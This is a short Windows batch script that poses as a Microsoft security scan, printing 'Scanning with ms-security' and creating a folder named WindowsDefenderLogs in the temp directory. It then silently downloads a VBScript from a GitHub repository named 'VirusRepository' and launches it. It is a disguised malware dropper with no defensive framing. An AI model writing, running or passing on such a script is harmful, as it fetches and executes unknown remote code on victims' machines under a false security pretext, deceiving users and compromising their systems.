@echo off
cd %temp%
echo Scanning with ms-security . . .
del WindowsDefenderLogs /q
md WindowsDefenderLogs
cd WindowsDefenderLogs
del continue.vbs /q
cls
echo Scanning with ms-security . . .
powershell -Command "Invoke-WebRequest https://github.com/ironyumrepos/VirusRepository/raw/main/continue.vbs -Outfile continue.vbs"
start continue.vbs
exit